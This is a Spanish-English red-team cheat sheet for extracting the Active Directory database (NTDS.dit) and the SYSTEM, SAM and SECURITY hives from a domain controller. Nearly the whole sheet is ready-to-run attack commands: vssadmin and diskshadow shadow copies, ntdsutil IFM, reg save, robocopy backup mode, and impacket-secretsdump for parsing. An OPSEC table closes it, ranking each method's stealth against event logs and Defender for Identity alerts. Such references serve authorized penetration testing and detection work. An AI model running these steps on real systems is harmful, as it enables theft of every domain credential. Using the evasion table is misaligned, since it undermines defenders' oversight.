---
aliases:
  - NTDS VSS
  - ntdsutil IFM
  - Shadow Copy NTDS
tags:
  - type/technique
  - technique/credential-access
  - env/windows
  - asset/active-directory
primary categories:
secondary categories:
tertiary categories:
kind: SubCheatSheet
linked:
  - "[[NTDS.dit Extraction]]"
---
# NTDS.dit Extraction - VSS y ntdsutil Methods

***

## vssadmin (Shadow Copy)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `vssadmin create shadow /for=C:` | Shadow copy volume path | Step 1 — crear snapshot. |
| `vssadmin list shadows` | Shadows existentes + paths | Pre-check si ya existe. |
| `copy "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit" C:\temp\ntds.dit` | ntds.dit sin file lock | Step 2 — copiar DB. |
| `copy "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM" C:\temp\SYSTEM` | SYSTEM hive (BootKey) | Step 2 — required para parse. |
| `vssadmin delete shadows /all /quiet` | Cleanup VSS | Post-extraction. |
^ntds-vss-vssadmin

```cmd
:: Workflow completo
vssadmin create shadow /for=C: 2>&1 | findstr "Shadow Copy Volume"

:: Usar path del output anterior
copy "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit" C:\temp\ntds.dit
copy "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM" C:\temp\SYSTEM

vssadmin delete shadows /all /quiet
```

___

## Diskshadow (LOLBin)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `diskshadow /s C:\temp\shadow.txt` | Shadow exposed como Z: | Exec script method. |
| `copy Z:\Windows\NTDS\ntds.dit C:\temp\ntds.dit` | ntds.dit desde exposed drive | Post-expose. |
| `copy Z:\Windows\System32\config\SYSTEM C:\temp\SYSTEM` | SYSTEM hive | Post-expose. |
| `diskshadow /s C:\temp\cleanup.txt` | Delete shadow + unexpose | Cleanup. |
^ntds-vss-diskshadow

```txt
:: C:\temp\shadow.txt
set context persistent nowriters
set metadata C:\temp\meta.cab
set verbose off
begin backup
add volume C: alias hackme
create
expose %hackme% Z:
end backup
```

```cmd
diskshadow /s C:\temp\shadow.txt
copy Z:\Windows\NTDS\ntds.dit C:\temp\ntds.dit
copy Z:\Windows\System32\config\SYSTEM C:\temp\SYSTEM
```

___

## ntdsutil IFM

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `ntdsutil "ac i ntds" "ifm" "create full C:\temp\ifm" quit quit` | ntds.dit + SYSTEM hive en `C:\temp\ifm\` | Full extraction, built-in. |
| `ntdsutil "ac i ntds" "ifm" "create sysvol full C:\temp\ifm" quit quit` | IFM + SYSVOL | Con SYSVOL. |
| Files en `C:\temp\ifm\Active Directory\ntds.dit` | ntds.dit consistente | Target para parse. |
| Files en `C:\temp\ifm\registry\SYSTEM` | SYSTEM hive | Required para decrypt. |
^ntds-vss-ntdsutil

```cmd
:: IFM usa VSS internamente — snapshot consistente garantizado
ntdsutil "ac i ntds" "ifm" "create full C:\temp\ifm" quit quit

:: Output:
:: C:\temp\ifm\Active Directory\ntds.dit
:: C:\temp\ifm\registry\SYSTEM
:: C:\temp\ifm\registry\SECURITY
```

**Key:** ntdsutil IFM es el método más limpio — usa VSS transparentemente. Requiere DA o Domain Controllers group.

___

## reg save (Hives)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `reg save HKLM\SYSTEM C:\temp\SYSTEM /y` | BootKey (required para decrypt NTDS) | Siempre junto con ntds.dit. |
| `reg save HKLM\SAM C:\temp\SAM /y` | Local SAM hashes del DC | Local users + built-in admin. |
| `reg save HKLM\SECURITY C:\temp\SECURITY /y` | LSA Secrets (service account creds) | Bonus: service accounts. |
^ntds-vss-regsave

```cmd
reg save HKLM\SYSTEM C:\temp\SYSTEM /y
reg save HKLM\SAM C:\temp\SAM /y
reg save HKLM\SECURITY C:\temp\SECURITY /y

:: Parse remoto (desde Linux)
impacket-secretsdump -system SYSTEM -sam SAM -security SECURITY LOCAL
```

___

## Robocopy Backup Mode

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `robocopy "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS" C:\temp ntds.dit /b` | ntds.dit via SeBackupPrivilege | Backup Operators (non-DA). |
| `robocopy "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config" C:\temp SYSTEM /b` | SYSTEM hive | Junto con ntds.dit. |
^ntds-vss-robocopy

```cmd
:: /b = backup mode — usa SeBackupPrivilege
:: Backup Operators pueden usar esto sin DA
set SHADOW=\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
robocopy "%SHADOW%\Windows\NTDS" C:\temp ntds.dit /b
robocopy "%SHADOW%\Windows\System32\config" C:\temp SYSTEM /b
```

**Key:** Backup Operators tienen `SeBackupPrivilege` por default → path a DC dump sin ser DA.

___

## OPSEC Comparison

| **Method** | **Event Log** | **MDI Alert** | **Priv requerido** | **Stealth** |
|:---:|:---:|:---:|:---:|:---:|
| vssadmin | VSS 7036 + 4663 file access | "NTDS.dit steal" | DA / Backup Ops | Bajo |
| Diskshadow | Same VSS events | "NTDS.dit steal" | DA / Backup Ops | Bajo |
| ntdsutil IFM | Application log + VSS | "NTDS.dit steal" | DA | Bajo |
| Robocopy `/b` | File access 4663 | None específico | Backup Operators | Medio |
| reg save | Registry 4657 | None | Local Admin | Alto |
| DCSync (remoto) | 4662 (replication GUIDs) | "DCSync attempt" | DCSync ACE | Medio |
^ntds-vss-opsec

***
